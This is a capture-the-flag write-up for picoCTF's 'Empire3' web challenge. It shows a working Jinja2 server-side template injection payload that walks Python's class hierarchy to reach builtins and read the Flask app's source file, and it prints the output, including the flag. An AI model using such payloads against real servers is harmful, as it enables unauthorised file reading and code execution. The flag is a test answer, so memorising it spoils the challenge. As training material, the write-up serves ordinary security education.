# Empire3
Web Exploitation, 500 points

## Description:
> Agent 513! One of your dastardly colleagues is laughing very sinisterly! Can you access his todo list and discover his nefarious plans?


## Solution: 

This is the follow-up for [Empire2](Empire2.md).

We'll use the same solution that worked for the previous challenge:

```console
root@kali:/media/sf_CTFs/pico/Empire3# python shell.py
Logged in
(Cmd) send 4*4
Sending: '{{4*4}}'

16

(Cmd) send ''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').path.join('app', '__init__.py')).read
()
Sending: '{{''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').path.join('app', '__init__.py')).read()}}'

from flask import Flask
from app.config import Config
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager
from flask_bootstrap import Bootstrap
import time,atexit
from apscheduler.schedulers.background import BackgroundScheduler

app = Flask(__name__)
app.config.from_object(Config)
db = SQLAlchemy(app)
login = LoginManager(app)
login.login_view = 'login'
bootstrap=Bootstrap(app)

from app import routes,models

def DB_init(db):
    db.drop_all()
    db.create_all()

    u = models.User(username='jarrett.booz',password_hash='deadbeef',id=1,admin=0,secret='Likes Oreos.', name="Jarrett Booz")
    db.session.add(u)

    u = models.User(username='danny.tunitis',password_hash='deadbeef',id=2,admin=0,secret='Know it all.', name= "Danny Tunitis")
    db.session.add(u)

    c = models.Todo(item='Shrink the moon', user_id=1)
    db.session.add(c)

    c = models.Todo(item='Grab the moon', user_id=1)
    db.session.add(c)

    c = models.Todo(item='Sit on the toilet', user_id=1)
    db.session.add(c)

    c = models.Todo(item='Make 2000 more Pico problems', user_id=2)
    db.session.add(c)

    c = models.Todo(item='Do dastardly plan: picoCTF{cookies_are_a_sometimes_food_8038d44f}', user_id=2)
    db.session.add(c)

    c = models.Todo(item='Buy milk', user_id=2)
    db.session.add(c)

    db.session.commit()

try:
    DB_init(db)
    scheduler = BackgroundScheduler()
    scheduler.add_job(func=DB_init,args=(db,),trigger="interval",hours=2)
    scheduler.start()
    atexit.register(lambda: scheduler.shutdown())
except Exception as e:
    print(e)
```

The flag is related to cookies (`picoCTF{cookies_are_a_sometimes_food_8038d44f}`), so again, this looked like an unintended solution.